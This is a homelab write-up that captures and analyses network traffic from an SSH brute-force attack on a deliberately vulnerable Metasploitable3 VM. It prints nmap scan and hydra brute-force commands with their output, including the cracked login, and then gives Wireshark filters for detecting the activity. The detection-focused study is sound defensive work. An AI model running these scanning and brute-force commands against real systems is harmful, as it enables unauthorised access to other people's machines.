# SSH Brute Force PCAP Analysis ```[Homelab Environment]```

* Attack Machine: ```10.38.1.111```
* Victim Machine: ```10.38.1.110```

> Note: PCAP file is available in this repository, if you've taken an interest in this project and would like to do some analysis yourself. The PCAP file does not have any generated traffic, and there isn't a lot of investigation behind it. However, this demonstrates traffic specifically from a SSH brute force attack.
# tcpdump

We specify tcpdump to write the capture information to ```/home/vagrant/ssh_cap``` on the eth0 interface and specify verbose output in the Metasploitable3 machine.

<img src="https://i.postimg.cc/85K9HQ4X/image.png">

# Exploitation

```console
parrot@attackbox$ 
parrot@attackbox$ 
parrot@attackbox$ ping 10.38.1.110 # Threw in some ICMP traffic.
PING 10.38.1.110 (10.38.1.110) 56(84) bytes of data.
64 bytes from 10.38.1.110: icmp_seq=1 ttl=64 time=1.00 ms
64 bytes from 10.38.1.110: icmp_seq=2 ttl=64 time=0.854 ms
64 bytes from 10.38.1.110: icmp_seq=3 ttl=64 time=1.04 ms
64 bytes from 10.38.1.110: icmp_seq=4 ttl=64 time=0.892 ms
64 bytes from 10.38.1.110: icmp_seq=5 ttl=64 time=0.949 ms
64 bytes from 10.38.1.110: icmp_seq=6 ttl=64 time=0.980 ms
64 bytes from 10.38.1.110: icmp_seq=7 ttl=64 time=0.959 ms
64 bytes from 10.38.1.110: icmp_seq=8 ttl=64 time=1.05 ms
^V64 bytes from 10.38.1.110: icmp_seq=9 ttl=64 time=0.975 ms
^C
--- 10.38.1.110 ping statistics ---
9 packets transmitted, 9 received, 0% packet loss, time 8062ms
rtt min/avg/max/mdev = 0.854/0.965/1.047/0.059 ms
parrot@attackbox$ 
parrot@attackbox$ 
parrot@attackbox$ nmap -sV -p 1-1000 10.38.1.110 # simulated 1000 ports getting scanned (a bit more realistic rather than "-p 22" parameter.
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-19 03:50 GMT
Nmap scan report for 10.38.1.110
Host is up (0.0018s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.7
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp open  ipp         CUPS 1.7
Service Info: Hosts: 127.0.2.1, METASPLOITABLE3-UB1404; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.63 seconds
parrot@attackbox$ 
parrot@attackbox$ 
parrot@attackbox$ hydra -L /home/parrot/Desktop/usernamelistlab.txt -P /home/parrot/Desktop/passlistlab.txt 10.38.1.110 ssh # Note, each word list has something like 60 entries. Although I didn't want to make them too big, I wanted some substance in the PCAP.
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-19 03:50:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3055 login tries (l:65/p:47), ~191 tries per task
[DATA] attacking ssh://10.38.1.110:22/
[STATUS] 494.00 tries/min, 494 tries in 00:01h, 2566 to do in 00:06h, 16 active
[STATUS] 472.00 tries/min, 1416 tries in 00:03h, 1644 to do in 00:04h, 16 active
[22][ssh] host: 10.38.1.110   login: vagrant   password: vagrant # Username & Password
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
parrot@attackbox$ 
parrot@attackbox$ 
parrot@attackbox$ ssh vagrant@10.38.1.110
vagrant@10.38.1.110's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
vagrant@metasploitable3-ub1404:~$ 
vagrant@metasploitable3-ub1404:~$ 
vagrant@metasploitable3-ub1404:~$ touch SSH_DONE.TXT.COMPLETE
```

After completing the exploitation and packet capture, we can move the PCAP via ```scp``` command.

<img src="https://i.postimg.cc/J7bJXLkm/image.png">

# Analyzing The PCAP

We ended up capturing quite a few packs and so, I thought it'd be neat to try a few different display filters I've come up with to make some observations about the traffic.

* First, let's see the amount of ICMP requests that were made to our victim's machine by using: ```icmp and !ip.src==10.38.1.110``` - which shows us ICMP traffic and not the ip source of ```10.38.1.110```. Wireshark shows ```9``` displayed items.

<img src="https://i.postimg.cc/3wCY1yQw/image.png">

* Port scanning begins at 03:50:13 in the PCAP (UTC).
* We see characteristics of an open port TCP scan communication. By filtering the TCP reset flag, we can see that there is a reset for each open port on Metasploitable3.

Here are the returned open port results from earlier:
```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.7
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp open  ipp         CUPS 1.7
```
<img src="https://i.postimg.cc/XvBKZymp/image.png">

And we can compare this to the reset flags using: ```tcp.flags.reset==1 and !ip.src==10.38.1.110``` display filter. You can find more supplementary reading at this [blog post](https://medium.com/@thismanera/nmap-detection-with-wireshark-e780c73a0823) about the various scan types and how they appear on wireshark. This may be a future project for myself, as the other scans fall out of the scope for this particular lab observation.

### SSH Analysis
<img src ="https://i.postimg.cc/MTgyWnH0/image.png">

By simply filtering the port (```tcp.port==22 and ip.src==10.38.1.111```), we can already note the malicious activity (huge amount of traffic being directed to port 22 - alternating attack src ports). Because SSH is secure, not much information can be observed through the TCP stream.

At the end of the attack we can flip over to our server as traffic source (```tcp.port==22 and ip.src==10.38.1.110```) -- The length jumps and we get some interesting info. From some supplementary reading, I learned successful authentication has an increased length.

<img src="https://i.postimg.cc/y8DdXsTt/image.png">
